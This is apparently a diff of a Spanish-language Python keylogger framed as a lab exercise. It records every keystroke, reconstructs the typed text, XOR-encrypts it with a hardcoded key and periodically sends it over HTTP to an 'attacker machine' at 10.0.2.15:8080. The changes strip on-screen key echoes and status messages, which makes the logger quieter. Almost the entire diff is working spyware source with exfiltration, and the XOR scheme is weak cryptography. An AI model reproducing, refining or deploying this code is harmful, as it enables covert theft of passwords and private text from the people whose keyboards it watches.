@@ -18,22 +18,20 @@ class SimpleCrypto:
     
     def __init__(self, password="ClaveSecreta2025-CyberSeguridad"):
         """
-        Inicializa el cifrador con una clave.
-        
-
+        inicializa el cifrador con una clave.
         """
-        # Generamos una clave numérica a partir del password
+        # generamos una clave numérica a partir del password
         self.key = self._generate_key(password)
     
     def _generate_key(self, password):
         """
-        Convierte el password en una secuencia de números para el cifrado XOR.
+        convierte el password en una secuencia de números para el cifrado XOR.
         """
-        # Usamos hash SHA-256 para generar una clave consistente
+        # usamos hash SHA-256 para generar una clave consistente
         hash_object = hashlib.sha256(password.encode())
         hex_dig = hash_object.hexdigest()
         
-        # Convertimos cada par de caracteres hex en números
+        # convertimos cada par de caracteres hex en números
         key = []
         for i in range(0, len(hex_dig), 2):
             key.append(int(hex_dig[i:i+2], 16))
@@ -53,22 +51,21 @@ class SimpleCrypto:
             if not text:
                 return ""
             
-            # Convertir texto a bytes
+            # convertir texto a bytes
             text_bytes = text.encode('utf-8')
             
-            # Aplicar XOR con la clave (ciclando la clave si es necesario)
+            # aplicar XOR con la clave (ciclando la clave si es necesario)
             encrypted_bytes = bytearray()
             for i, byte in enumerate(text_bytes):
                 key_byte = self.key[i % len(self.key)]
                 encrypted_bytes.append(byte ^ key_byte)
             
-            # Codificar en Base64 para que sea texto
+            # codificar en Base64 para que sea texto
             encrypted_b64 = base64.b64encode(encrypted_bytes).decode('utf-8')
             
             return encrypted_b64
             
         except Exception as e:
-            print(f"❌ Error cifrando: {e}")
             return ""
 
 class UnifiedKeylogger:
@@ -128,47 +125,43 @@ class UnifiedKeylogger:
         print(f"🚨 presiona ctrl+c para detener\n")
     
     def keyPressed(self, key):
-
-        print(f"🔑 Tecla: {str(key)}")  # en pantalla qué tecla se presionó
+        # capturar tecla presionada sin mostrar en pantalla
         
         # timestamp actual
         time_stamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         
-        # la tecla al archivo de log
+        # guardar la tecla al archivo de log
         with open(self.log_file, "a", encoding="utf-8") as logkey:
             try:
-                # ¿Es un carácter normal? (letra, número, símbolo)
+                # ¿es un carácter normal? (letra, número, símbolo)
                 if hasattr(key, 'char') and key.char is not None:
                     logkey.write(f"{time_stamp}: {key.char}\n")
                 else:
-                    # Es una tecla especial (space, enter, ctrl, etc.)
+                    # es una tecla especial (space, enter, ctrl, etc.)
                     logkey.write(f'[{key.name}]')
             except AttributeError:
-                # Por si acaso hay alguna tecla rara que no podemos manejar
+                # por si acaso hay alguna tecla rara que no podemos manejar
                 logkey.write(f'[{str(key)}]')
         
         self.keys_captured += 1  # +1 tecla capturada
     
     def reconstruct_text_worker(self):
         """
-        HILO DE RECONSTRUCCIÓN AUTOMÁTICA
+        hilo de reconstrucción automática
         
-        Este hilo corre en paralelo al keylogger su trabajo es revisar cada X segundos si necesita reconstruir el texto.
+        este hilo corre en paralelo al keylogger su trabajo es revisar cada X segundos si necesita reconstruir el texto.
         """
-
         
         while self.running:
             try:
                 current_time = time.time()
                 
-                # ¿Ya pasó el tiempo suficiente desde la última reconstrucción?
+                # ¿ya pasó el tiempo suficiente desde la última reconstrucción?
                 if current_time - self.last_reconstruction_time >= self.reconstruction_interval:
                     
-                    # ¿Hay un archivo de log para procesar?
+                    # ¿hay un archivo de log para procesar?
                     if os.path.exists(self.log_file) and os.path.getsize(self.log_file) > 0:
-                        print(f"\n🔄 Reconstruyendo texto automáticamente...")
                         
-        
                         resultado = self.reconstructor.reconstruir_texto(
                             log_path=self.log_file,
                             output_path=self.output_file,
@@ -176,35 +169,23 @@ class UnifiedKeylogger:
                             preserve_formatting=True
                         )
                         
-                        # 🔐 CIFRADO AUTOMÁTICO después de reconstruir
+                        # cifrado automático después de reconstruir
                         if self.enable_encryption and resultado:
-                            print(f"🔐 Cifrando texto automáticamente...")
                             encrypted_text = self.crypto.encrypt(resultado)
                             
-                            # Guardar texto cifrado
+                            # guardar texto cifrado
                             with open(self.encrypted_file, "w", encoding="utf-8") as enc_file:
                                 enc_file.write(encrypted_text)
                             
                             self.encryptions_done += 1
-                            print(f"✅ Texto cifrado guardado")
                         
                         self.reconstructions_done += 1
                         self.last_reconstruction_time = current_time
-                        
-                        # preview del texto actual
-                        preview = resultado[:100] + "..." if len(resultado) > 100 else resultado
-                        print(f"📝 Texto actual: {repr(preview)}")
-                        
-                        stats_msg = f"📊 Estadísticas: {self.keys_captured} teclas | {self.reconstructions_done} reconstrucciones"
-                        if self.enable_encryption:
-                            stats_msg += f" | {self.encryptions_done} cifrados"
-                        print(f"{stats_msg}\n")
                     
-                # Espera antes de envío 
+                # espera antes de revisar de nuevo 
                 time.sleep(1)
                 
             except Exception as e:
-                print(f"❌ Error en reconstrucción automática: {e}")
                 time.sleep(5) 
     
     def send_encrypted_data(self):
@@ -237,17 +218,13 @@ class UnifiedKeylogger:
             
             if response.status_code == 200:
                 self.sends_done += 1
-                print(f"📡 envío #{self.sends_done} exitoso a {self.target_ip}")
                 return True
             else:
-                print(f"📡 error en envío: status {response.status_code}")
                 return False
                 
         except requests.exceptions.RequestException as e:
-            print(f"📡 error de conexión: sin respuesta del host")
             return False
         except Exception as e:
-            print(f"📡 error enviando datos: {e}")
             return False
     
     def send_worker(self):
@@ -266,12 +243,11 @@ class UnifiedKeylogger:
                 time.sleep(1)
                 
             except Exception as e:
-                print(f"📡 error en hilo de envío: {e}")
                 time.sleep(5)  # pausa más larga si hay error
     
     def start(self):
         try:
-            # limpio logs anteriores
+            # limpiar logs anteriores
             self.clear_previous_logs()
             
             self.running = True
@@ -292,37 +268,32 @@ class UnifiedKeylogger:
                     daemon=True
                 )
                 self.send_thread.start()
-                print(f"📡 hilo de envío iniciado (cada {self.send_interval}s)")
             
             # listener del keylogger
-            print("capturando teclas...")
             listener = keyboard.Listener(on_press=self.keyPressed)
             listener.start()
 
             listener.join()  
             
         except KeyboardInterrupt:
-            print("\n🛑 Deteniendo keylogger...")
             self.stop()
         except Exception as e:
-            print(f"💥 Error crítico: {e}")
             self.stop()
     
     def stop(self):
-        # paro todos los hilos
+        # parar todos los hilos
         self.running = False
         
-        # espero a que termine el hilo de reconstrucción
+        # esperar a que termine el hilo de reconstrucción
         if self.reconstruction_thread and self.reconstruction_thread.is_alive():
             self.reconstruction_thread.join(timeout=5)
         
-        # espero a que termine el hilo de envío
+        # esperar a que termine el hilo de envío
         if self.send_thread and self.send_thread.is_alive():
             self.send_thread.join(timeout=5)
         
-        # hago una última reconstrucción antes de cerrar
+        # hacer una última reconstrucción antes de cerrar
         if os.path.exists(self.log_file) and os.path.getsize(self.log_file) > 0:
-            print("🔄 Reconstrucción final...")
             try:
                 resultado = self.reconstructor.reconstruir_texto(
                     log_path=self.log_file,
@@ -331,18 +302,15 @@ class UnifiedKeylogger:
                     preserve_formatting=True
                 )
                 
-                # 🔐 CIFRADO FINAL
+                # cifrado final
                 if self.enable_encryption and resultado:
-                    print("🔐 Cifrado final...")
                     encrypted_text = self.crypto.encrypt(resultado)
                     with open(self.encrypted_file, "w", encoding="utf-8") as enc_file:
                         enc_file.write(encrypted_text)
                     self.encryptions_done += 1
-                    print("✅ Cifrado final completado")
                 
-                print("✅ Reconstrucción final completada")
             except Exception as e:
-                print(f"❌ Error en reconstrucción final: {e}")
+                pass
         
         print(f"📊 RESUMEN FINAL:")
         print(f"   - Teclas capturadas: {self.keys_captured}")
@@ -358,21 +326,19 @@ class UnifiedKeylogger:
         print("👋 ¡Keylogger detenido!")
     
     def clear_previous_logs(self):
-
+        # limpiar archivos de sesiones anteriores
         try:
             if os.path.exists(self.log_file):
                 os.remove(self.log_file)
-                print("🧹 Log anterior eliminado")
             
             if os.path.exists(self.encrypted_file):
                 os.remove(self.encrypted_file)
-                print("🧹 Archivo cifrado anterior eliminado")
         except Exception as e:
-            print(f"⚠️  No se pudieron limpiar archivos anteriores: {e}")
+            pass
 
 def main():
     """
-    🎬 FUNCIÓN PRINCIPAL - AQUÍ EMPIEZA TODO
+    función principal - aquí empieza todo
     """
     print("=" * 60)
     print("🚀 KEYLOGGER UNIFICADO EN TIEMPO REAL")
@@ -386,12 +352,12 @@ def main():
     print("   - Envía datos cifrados a máquina atacante 📡")
     print("=" * 60)
     
-    # 🎯 CONFIGURACIÓN DEL LABORATORIO
-    RECONSTRUCTION_INTERVAL = 3  # Cada 3 segundos reconstruye texto
-    ENABLE_ENCRYPTION = True     # 🔐 ¿Activar cifrado automático?
-    SEND_INTERVAL = 10          # Cada 10 segundos envía datos
-    TARGET_IP = "10.0.2.15"     # 📡 IP de tu máquina atacante
-    TARGET_PORT = 8080          # Puerto del servidor receptor
+    # configuración del laboratorio
+    RECONSTRUCTION_INTERVAL = 3  # cada 3 segundos reconstruye texto
+    ENABLE_ENCRYPTION = True     # ¿activar cifrado automático?
+    SEND_INTERVAL = 10          # cada 10 segundos envía datos
+    TARGET_IP = "10.0.2.15"     # ip de tu máquina atacante
+    TARGET_PORT = 8080          # puerto del servidor receptor
     
     print(f"🎯 Configuración del laboratorio:")
     print(f"   - Máquina atacante: {TARGET_IP}:{TARGET_PORT}")
